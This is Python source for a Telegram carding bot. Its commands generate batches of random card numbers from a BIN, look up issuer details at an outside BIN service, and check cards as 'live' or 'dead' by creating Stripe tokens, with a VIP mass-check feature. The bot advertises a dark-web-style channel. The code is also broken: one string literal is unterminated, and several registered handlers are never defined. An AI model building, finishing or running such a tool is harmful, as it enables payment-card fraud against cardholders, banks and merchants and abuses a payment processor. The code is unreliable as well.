import os
import random
import re
import asyncio
import aiohttp
import stripe
import time
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from aiohttp import web

# ✅ Global Variables
STRIPE_KEY = None
TOKEN = os.getenv("TELEGRAM_TOKEN")
ADMIN_ID = 6972264549  # Admin ID for restricted commands
VIP_USERS = set()  # Dynamic list of premium users

# ✅ BIN Lookup API
async def get_bin_info(bin_number):
    url = f"https://bins.antipublic.cc/bins/{bin_number}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as response:
                if response.status == 200:
                    return await response.json()
    except Exception as e:
        print(f"BIN API Error: {e}")
    return None

# ✅ Card Generator Command
async def gen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 1 or not re.match(r"^\d{6}$", context.args[0]):
        await update.message.reply_text("❌ Invalid BIN format!\nExample: `/gen 424242`")
        return

    bin_number = context.args[0]
    cards = []
    for _ in range(15):  # Generate 15 cards
        card_number = bin_number + ''.join(str(random.randint(0, 9)) for _ in range(16 - len(bin_number)))
        expiry_month = str(random.randint(1, 12)).zfill(2)
        expiry_year = str(random.randint(2025, 2030))  # Future expiry year
        cvv = str(random.randint(100, 999))
        cards.append(f"{card_number}|{expiry_month}|{expiry_year}|{cvv}")

    bin_info = await get_bin_info(bin_number) or {"vendor": "Unknown", "type": "Unknown", "country_name": "Unknown", "bank": "Unknown"}
    
    message = (
        f"🔥 **Generated Cards** (`/gen`)"
━━━━━━━━━━━━━━━━━━\n"
        f"📌 **BIN:** {bin_number}\n"
        f"🏦 **Issuer:** {bin_info.get('bank', 'Unknown')}\n"
        f"🌍 **Country:** {bin_info.get('country_name', 'Unknown')}\n"
        f"🔖 **Type:** {bin_info.get('type', 'Unknown')}\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"💳 **Cards (15x)**:\n"
        f"``\n" + "\n".join(cards) + "\n``\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"Join @DarkDorking for more!"
    )
    await update.message.reply_text(message, parse_mode="Markdown")

# ✅ Card Check Command
async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global STRIPE_KEY
    if STRIPE_KEY is None:
        await update.message.reply_text("❌ No Stripe API key found! Admin needs to add it using /addsk")
        return

    args = context.args
    if len(args) < 1 or not re.match(r"^\d{16}\|\d{2}\|\d{4}\|\d{3}$", args[0]):
        await update.message.reply_text("❌ Invalid format!\nExample: `/chk 4242424242424242|12|2025|123`")
        return

    card_details = args[0].split('|')
    stripe.api_key = STRIPE_KEY

    try:
        token = stripe.Token.create(
            card={
                "number": card_details[0],
                "exp_month": int(card_details[1]),
                "exp_year": int(card_details[2]),
                "cvc": card_details[3],
            }
        )
        status = "✅ Live Card"
        response_message = "Card is active and approved."
    except stripe.error.CardError as e:
        status = "❌ Dead Card"
        response_message = e.user_message or "Your card was declined."
    except Exception as e:
        status = "⚠️ Error"
        response_message = f"Unexpected error: {str(e)}"
        print(f"❌ ERROR LOG: {str(e)}")

    await update.message.reply_text(f"💳 Card: `{args[0]}`\n📌 Status: {status}\n📢 Response: {response_message}", parse_mode="Markdown")

# ✅ Mass Check Command (VIP Only)
async def mass(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.from_user.id not in VIP_USERS:
        await update.message.reply_text("❌ This command is only for VIP users!")
        return

    cards = context.args
    if len(cards) > 10:
        await update.message.reply_text("❌ You can only check up to 10 cards at once!")
        return

    results = []
    for card in cards:
        args = card.split('|')
        if len(args) != 4:
            results.append(f"{card} ❌ Invalid Format")
            continue

        stripe.api_key = STRIPE_KEY
        try:
            token = stripe.Token.create(
                card={
                    "number": args[0],
                    "exp_month": int(args[1]),
                    "exp_year": int(args[2]),
                    "cvc": args[3],
                }
            )
            results.append(f"{card} ✅ Live Card")
        except stripe.error.CardError:
            results.append(f"{card} ❌ Dead Card")
        except Exception as e:
            results.append(f"{card} ⚠️ Error: {str(e)}")

    await update.message.reply_text("\n".join(results))

# ✅ Bot Initialization
async def run_services():
    application = ApplicationBuilder().token(TOKEN).build()
    application.add_handler(CommandHandler("addsk", addsk))
    application.add_handler(CommandHandler("viewsk", viewsk))
    application.add_handler(CommandHandler("gen", gen))
    application.add_handler(CommandHandler("chk", chk))
    application.add_handler(CommandHandler("mass", mass))
    application.add_handler(CommandHandler("addvip", addvip))
    application.add_handler(CommandHandler("removevip", removevip))
    
    # Start web server for health check
    app = web.Application()
    app.router.add_get("/health", health_check)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", 8080)
    await site.start()
    
    while True:
        await asyncio.sleep(3600)

if __name__ == "__main__":
    asyncio.run(run_services())
